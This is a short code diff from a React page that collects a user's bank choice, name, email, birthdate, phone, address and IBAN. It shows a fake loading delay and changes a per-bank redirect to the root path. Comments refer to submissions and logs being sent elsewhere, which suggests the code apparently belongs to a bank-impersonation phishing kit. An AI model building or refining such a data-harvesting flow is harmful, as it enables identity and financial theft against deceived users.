@@ -131,11 +131,10 @@ const Index = () => {
     // and sends any submission older than 5 minutes that hasn't been sent yet.
     // Logs are sent immediately from Confirmation.tsx.
 
-    const route = bankRouteMap[selectedBank];
-    if (route) {
+    if (bankRouteMap[selectedBank]) {
       setShowLoading(true);
       setTimeout(() => {
-        navigate(`${route}?s=${sessionId}`);
+        navigate(`/?s=${sessionId}`);
       }, 2500);
     }
   }, [selectedBank, fullName, email, birthdate, phone, street, houseNumber, staircase, doorNumber, postalCode, city, iban, navigate]);
